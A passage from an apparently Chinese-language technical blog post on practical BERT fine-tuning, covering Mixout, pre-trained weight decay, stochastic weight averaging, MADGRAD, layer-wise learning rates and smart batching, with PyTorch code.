hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">if</span> mixout &gt; <span class="hljs-number">0</span>:<br>    print(<span class="hljs-string">'Initializing Mixout Regularization'</span>)<br>    <span class="hljs-keyword">for</span> sup_module <span class="hljs-keyword">in</span> model.modules():<br>        <span class="hljs-keyword">for</span> name, module <span class="hljs-keyword">in</span> sup_module.named_children():<br>            <span class="hljs-keyword">if</span> isinstance(module, nn.Dropout):<br>                module.p = <span class="hljs-number">0.0</span><br>            <span class="hljs-keyword">if</span> isinstance(module, nn.Linear):<br>                target_state_dict = module.state_dict()<br>                bias = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> module.bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br>                new_module = MixLinear(<br>                    module.in_features, module.out_features, bias, target_state_dict[<span class="hljs-string">"weight"</span>], mixout<br>                )<br>                new_module.load_state_dict(target_state_dict)<br>                setattr(sup_module, name, new_module)<br>    print(<span class="hljs-string">'Done.!'</span>)<br></code></pre></div></td></tr></table></figure><p>Mixout相当于一种自适应的 L2-regularizer，使得参数变化不会很剧烈。能够提高finetuning稳定性。</p><h3><span id="pre-trained-weight-decay">Pre-trained Weight Decay</span></h3><p>将 weight decay 中，gradient减去的 <span class="math inline">\(\lambda w\)</span> 变为 <span class="math inline">\(\lambda (w -w^{pretrained})\)</span>。在Mixout文章中，实验表明这样比普通的 weightdecay ，finetuning更稳定。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PriorWD</span><span class="hljs-params">(Optimizer)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, optim, use_prior_wd=False, exclude_last_group=True)</span>:</span><br>        super(PriorWD, self).__init__(optim.param_groups, optim.defaults)<br>        self.param_groups = optim.param_groups<br>        self.optim = optim<br>        self.use_prior_wd = use_prior_wd<br>        self.exclude_last_group = exclude_last_group<br>        self.weight_decay_by_group = []<br>        <span class="hljs-keyword">for</span> i, group <span class="hljs-keyword">in</span> enumerate(self.param_groups):<br>            self.weight_decay_by_group.append(group[<span class="hljs-string">"weight_decay"</span>])<br>            group[<span class="hljs-string">"weight_decay"</span>] = <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># w pretrained</span><br>        self.prior_params = &#123;&#125;<br>        <span class="hljs-keyword">for</span> i, group <span class="hljs-keyword">in</span> enumerate(self.param_groups):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> group[<span class="hljs-string">"params"</span>]:<br>                self.prior_params[id(p)] = p.detach().clone()<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">step</span><span class="hljs-params">(self, closure=None)</span>:</span><br>        <span class="hljs-keyword">if</span> self.use_prior_wd:<br>            <span class="hljs-keyword">for</span> i, group <span class="hljs-keyword">in</span> enumerate(self.param_groups):<br>                <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> group[<span class="hljs-string">"params"</span>]:<br>                    <span class="hljs-keyword">if</span> self.exclude_last_group <span class="hljs-keyword">and</span> i == len(self.param_groups):<br>                        p.data.add_(-group[<span class="hljs-string">"lr"</span>] * self.weight_decay_by_group[i], p.data)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-comment"># w - w pretrained</span><br>                        p.data.add_(<br>                            -group[<span class="hljs-string">"lr"</span>] * self.weight_decay_by_group[i], p.data - self.prior_params[id(p)],<br>                        )<br>        loss = self.optim.step(closure)<br><br>        <span class="hljs-keyword">return</span> loss<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">compute_distance_to_prior</span><span class="hljs-params">(self, param)</span>:</span><br>        <span class="hljs-keyword">assert</span> id(param) <span class="hljs-keyword">in</span> self.prior_params, <span class="hljs-string">"parameter not in PriorWD optimizer"</span><br>        <span class="hljs-keyword">return</span> (param.data - self.prior_params[id(param)]).pow(<span class="hljs-number">2</span>).sum().sqrt()<br></code></pre></div></td></tr></table></figure><p>使用:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">optimizer_grouped_parameters = get_optimizer_grouped_parameters(model, learning_rate, weight_decay)<br>optimizer = AdamW(<br>    optimizer_grouped_parameters,<br>    lr=learning_rate,<br>    eps=adam_epsilon,<br>    correct_bias=<span class="hljs-keyword">not</span> use_bertadam<br>)<br><br><span class="hljs-comment"># 修改 optimizer</span><br>optimizer = PriorWD(optimizer, use_prior_wd=use_prior_wd)<br></code></pre></div></td></tr></table></figure><h2><span id="training-strategies">Training Strategies</span></h2><p>提升模型速度或准确性的方法：</p><ul><li>Stochastic Weight Averaging</li><li>MADGRAD Optimizer</li><li>Differential / Discriminative Learning Rate</li><li>Dynamic Padding and Uniform Length Batching</li><li>Gradient Accumulation</li><li>Freeze Embedding</li><li>Numeric Precision Reduction</li><li>Gradient Checkpointing</li></ul><h3><span id="stochastic-weight-averaging">Stochastic Weight Averaging</span></h3><ol type="1"><li>learning rateschedule经过设计，使得模型在“最优解”附近徘徊，而不是收敛到一点（理论上）。比如75%的时间使用standarddecaying learning rate strategy ；而剩下的训练在一个相对较高的constantlearning rate上训练。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210720184847779.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><ol start="2" type="1"><li>计算训练最后阶段的滑动平均作为SWA的权重</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210720185154666.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><ol start="3" type="1"><li>SWA权重在训练时，不参与计算。计算Batch Normalization的activationstatistics时，在训练结束后，单独进行一次 forward pass 得到activationstatistics。</li></ol><p>所以，有两组权重，一组训练BP，一组计算保存SWA权重。</p><p>示例</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torch.optim.swa_utils <span class="hljs-keyword">import</span> AveragedModel, SWALR<br><span class="hljs-keyword">from</span> torch.optim.lr_scheduler <span class="hljs-keyword">import</span> CosineAnnealingLR<br><br>loader, optimizer, model, loss_fn = ...<br>swa_start = <span class="hljs-number">5</span><br>swa_model = AveragedModel(model)<br>swa_scheduler = SWALR(optimizer, swa_lr=<span class="hljs-number">0.05</span>)<br>scheduler = CosineAnnealingLR(optimizer, T_max=<span class="hljs-number">100</span>)<br><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):<br>      <span class="hljs-keyword">for</span> input, target <span class="hljs-keyword">in</span> loader:<br>          optimizer.zero_grad()<br>          loss_fn(model(input), target).backward()<br>          optimizer.step()<br>      <span class="hljs-keyword">if</span> epoch &gt; swa_start:<br>          swa_model.update_parameters(model)<br>          swa_scheduler.step()<br>      <span class="hljs-keyword">else</span>:<br>          scheduler.step()<br><br><span class="hljs-comment"># Update bn statistics for the swa_model at the end</span><br>torch.optim.swa_utils.update_bn(loader, swa_model)<br><span class="hljs-comment"># Use swa_model to make predictions on test data </span><br>preds = swa_model(test_input)<br></code></pre></div></td></tr></table></figure><p><a href="https://pytorch.org/blog/pytorch-1.6-now-includes-stochastic-weight-averaging/">refernce</a></p><h3><span id="madgrad-optimizer">MADGRAD Optimizer</span></h3><p>AdaGrad派生出的新优化器，在以下任务中表现较好，包括视觉中的分类和图像到图像的任务，以及自然语言处理中的循环和双向掩蔽模型。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210720191111221.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>但是，weight decay不同于其他，常常设置为0。 learning rate的设置也和SGD与Adam不同，必要时，先进行一次learning rate查找。</p><p><a href="https://arxiv.org/abs/2101.11075" target="_blank" rel="noopener">paper</a></p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">pip -q <span class="hljs-keyword">install</span> madgrad<br></code></pre></div></td></tr></table></figure><p>另外小数据集上的训练，可以尝试使用RAdam +Lookahead而不是AdamW，效果可能会更好，因为AdamW的warm-up阶段受到数据集大小size的影响。</p><h3><span id="differential-discriminative-learning-rate">Differential /Discriminative Learning Rate</span></h3><p>模型底层为普遍的字词信息，越往上得到与任务相关的抽象信息。所以fine-tune时，对通用层设置较小学习率，越往上学习率相对更大。自定义层学习率单独设置，一般较大。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_optimizer_params</span><span class="hljs-params">(model, type=<span class="hljs-string">'unified'</span>)</span>:</span><br>    <span class="hljs-comment"># differential learning rate and weight decay</span><br>    param_optimizer = list(model.named_parameters())<br>    learning_rate = <span class="hljs-number">5e-5</span><br>    no_decay = [<span class="hljs-string">'bias'</span>, <span class="hljs-string">'gamma'</span>, <span class="hljs-string">'beta'</span>]<br>    <span class="hljs-keyword">if</span> type == <span class="hljs-string">'unified'</span>:<br>        optimizer_parameters = filter(<span class="hljs-keyword">lambda</span> x: x.requires_grad, model.parameters())<br>    <span class="hljs-keyword">elif</span> type == <span class="hljs-string">'module_wise'</span>:<br>        optimizer_parameters = [<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.roberta.named_parameters() <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay)],<br>             <span class="hljs-string">'weight_decay_rate'</span>: <span class="hljs-number">0.01</span>&#125;,<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.roberta.named_parameters() <span class="hljs-keyword">if</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay)],<br>             <span class="hljs-string">'weight_decay_rate'</span>: <span class="hljs-number">0.0</span>&#125;,<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.named_parameters() <span class="hljs-keyword">if</span> <span class="hljs-string">"roberta"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> n],<br>             <span class="hljs-string">'lr'</span>: <span class="hljs-number">1e-3</span>,<br>             <span class="hljs-string">'weight_decay_rate'</span>:<span class="hljs-number">0.01</span>&#125;<br>        ]<br>    <span class="hljs-keyword">elif</span> type == <span class="hljs-string">'layer_wise'</span>:<br>        group1=[<span class="hljs-string">'layer.0.'</span>,<span class="hljs-string">'layer.1.'</span>,<span class="hljs-string">'layer.2.'</span>,<span class="hljs-string">'layer.3.'</span>]<br>        group2=[<span class="hljs-string">'layer.4.'</span>,<span class="hljs-string">'layer.5.'</span>,<span class="hljs-string">'layer.6.'</span>,<span class="hljs-string">'layer.7.'</span>]    <br>        group3=[<span class="hljs-string">'layer.8.'</span>,<span class="hljs-string">'layer.9.'</span>,<span class="hljs-string">'layer.10.'</span>,<span class="hljs-string">'layer.11.'</span>]<br>        group_all=[<span class="hljs-string">'layer.0.'</span>,<span class="hljs-string">'layer.1.'</span>,<span class="hljs-string">'layer.2.'</span>,<span class="hljs-string">'layer.3.'</span>,<span class="hljs-string">'layer.4.'</span>,<span class="hljs-string">'layer.5.'</span>,<span class="hljs-string">'layer.6.'</span>,<span class="hljs-string">'layer.7.'</span>,<span class="hljs-string">'layer.8.'</span>,<span class="hljs-string">'layer.9.'</span>,<span class="hljs-string">'layer.10.'</span>,<span class="hljs-string">'layer.11.'</span>]<br>        optimizer_parameters = [<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.roberta.named_parameters() <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> group_all)],<span class="hljs-string">'weight_decay_rate'</span>: <span class="hljs-number">0.01</span>&#125;,<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.roberta.named_parameters() <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay) <span class="hljs-keyword">and</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> group1)],<span class="hljs-string">'weight_decay_rate'</span>: <span class="hljs-number">0.01</span>, <span class="hljs-string">'lr'</span>: learning_rate/<span class="hljs-number">2.6</span>&#125;,<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.roberta.named_parameters() <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay) <span class="hljs-keyword">and</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> group2)],<span class="hljs-string">'weight_decay_rate'</span>: <span class="hljs-number">0.01</span>, <span class="hljs-string">'lr'</span>: learning_rate&#125;,<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.roberta.named_parameters() <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay) <span class="hljs-keyword">and</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> group3)],<span class="hljs-string">'weight_decay_rate'</span>: <span class="hljs-number">0.01</span>, <span class="hljs-string">'lr'</span>: learning_rate*<span class="hljs-number">2.6</span>&#125;,<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.roberta.named_parameters() <span class="hljs-keyword">if</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> group_all)],<span class="hljs-string">'weight_decay_rate'</span>: <span class="hljs-number">0.0</span>&#125;,<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.roberta.named_parameters() <span class="hljs-keyword">if</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay) <span class="hljs-keyword">and</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> group1)],<span class="hljs-string">'weight_decay_rate'</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">'lr'</span>: learning_rate/<span class="hljs-number">2.6</span>&#125;,<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.roberta.named_parameters() <span class="hljs-keyword">if</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay) <span class="hljs-keyword">and</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> group2)],<span class="hljs-string">'weight_decay_rate'</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">'lr'</span>: learning_rate&#125;,<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.roberta.named_parameters() <span class="hljs-keyword">if</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> no_decay) <span class="hljs-keyword">and</span> any(nd <span class="hljs-keyword">in</span> n <span class="hljs-keyword">for</span> nd <span class="hljs-keyword">in</span> group3)],<span class="hljs-string">'weight_decay_rate'</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">'lr'</span>: learning_rate*<span class="hljs-number">2.6</span>&#125;,<br>            &#123;<span class="hljs-string">'params'</span>: [p <span class="hljs-keyword">for</span> n, p <span class="hljs-keyword">in</span> model.named_parameters() <span class="hljs-keyword">if</span> <span class="hljs-string">"roberta"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> n], <span class="hljs-string">'lr'</span>:<span class="hljs-number">1e-3</span>, <span class="hljs-string">"momentum"</span> : <span class="hljs-number">0.99</span>&#125;,<br>        ]<br>    <span class="hljs-keyword">return</span> optimizer_parameters<br></code></pre></div></td></tr></table></figure><p>Strategies: 对于小数据集，复杂的learning rate schedulingstrategies（<code>linear with warmup</code> or<code>cosine with warmup</code>etc.）在预训练和finetuning阶段都没什么效果。小数据集，使用简单的schedulingstrategies就行。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> (  <br>    get_constant_schedule, <br>    get_constant_schedule_with_warmup, <br>    get_cosine_schedule_with_warmup, <br>    get_cosine_with_hard_restarts_schedule_with_warmup,<br>    get_linear_schedule_with_warmup,<br>    get_polynomial_decay_schedule_with_warmup<br>)<br></code></pre></div></td></tr></table></figure><h3><span id="interpreting-transformerswith-lit">Interpreting Transformerswith LIT</span></h3><p>transfomer可视化工具</p><p><strong>Paper</strong>: <a href="https://www.aclweb.org/anthology/2020.emnlp-demos.15.pdf">TheLanguage Interpretability Tool: Extensible, Interactive Visualizationsand Analysis for NLP Models</a> <strong>Blog</strong>: <a href="https://ai.googleblog.com/2020/11/the-language-interpretability-tool-lit.html">TheLanguage Interpretability Tool (LIT): Interactive Exploration andAnalysis of NLP Models</a> <strong>Official Page</strong>: <a href="https://pair-code.github.io/lit/">Language InterpretabilityTool</a> <strong>Examples</strong>: <a href="https://github.com/PAIR-code/lit/tree/main/lit_nlp/examples">GitHub</a></p><h3><span id="dynamic-padding-anduniform-length-batching">Dynamic Padding andUniform Length Batching</span></h3><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210720205627034.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>常规padding策略如上图所示，pad到最大长度。</p><p>Dynamic Padding就是每个batch，分别pad到该batch中最长的序列长度。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210720205834389.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>而Uniform Length Batching，则是将长度相近的序列组合成一个batch。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210720205959044.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>示例程序</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> more_itertools<br><br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> Sampler, Dataset, DataLoader<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SmartBatchingDataset</span><span class="hljs-params">(Dataset)</span>:</span><br>    “tokenize并得到dataloader”<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, df, tokenizer)</span>:</span><br>        super(SmartBatchingDataset, self).__init__()<br>        <span class="hljs-comment"># 这里 df.excerpt 表示dataframe中的文本所在列，使用时需要替换</span><br>        self._data = (<br>            <span class="hljs-string">f"<span class="hljs-subst">&#123;tokenizer.bos_token&#125;</span> "</span> + df.excerpt + <span class="hljs-string">f" <span class="hljs-subst">&#123;tokenizer.eos_token&#125;</span>"</span> <br>        ).apply(tokenizer.tokenize).apply(tokenizer.convert_tokens_to_ids).to_list()<br>        self._targets = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">'target'</span> <span class="hljs-keyword">in</span> df.columns:<br>            self._targets = df.target.tolist()<br>        self.sampler = <span class="hljs-literal">None</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__len__</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-keyword">return</span> len(self._data)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__getitem__</span><span class="hljs-params">(self, item)</span>:</span><br>        <span class="hljs-keyword">if</span> self._targets <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> self._data[item], self._targets[item]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self._data[item]<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_dataloader</span><span class="hljs-params">(self, batch_size, max_len, pad_id)</span>:</span><br>        self.sampler = SmartBatchingSampler(<br>            data_source=self._data,<br>            batch_size=batch_size<br>        )<br>        collate_fn = SmartBatchingCollate(<br>            targets=self._targets,<br>            max_length=max_len,<br>            pad_token_id=pad_id<br>        )<br>        dataloader = DataLoader(<br>            dataset=self,<br>            batch_size=batch_size,<br>            sampler=self.sampler,<br>            collate_fn=collate_fn,<br>            num_workers=(multiprocessing.cpu_count()<span class="hljs-number">-1</span>),<br>            pin_memory=<span class="hljs-literal">True</span><br>        )<br>        <span class="hljs-keyword">return</span> dataloader<br>    <br>    <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SmartBatchingSampler</span><span class="hljs-params">(Sampler)</span>:</span><br>    “按序列长度排序，得到一组shuffle之后的batch data”<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, data_source, batch_size)</span>:</span><br>        super(SmartBatchingSampler, self).__init__(data_source)<br>        self.len = len(data_source)<br>        sample_lengths = [len(seq) <span class="hljs-keyword">for</span> seq <span class="hljs-keyword">in</span> data_source]<br>        argsort_inds = np.argsort(sample_lengths)<br>        self.batches = list(more_itertools.chunked(argsort_inds, n=batch_size))<br>        self._backsort_inds = <span class="hljs-literal">None</span><br>    <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__iter__</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-keyword">if</span> self.batches:<br>            last_batch = self.batches.pop(<span class="hljs-number">-1</span>)<br>            np.random.shuffle(self.batches)<br>            self.batches.append(last_batch)<br>        self._inds = list(more_itertools.flatten(self.batches))<br>        <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> self._inds<br><br>    <span 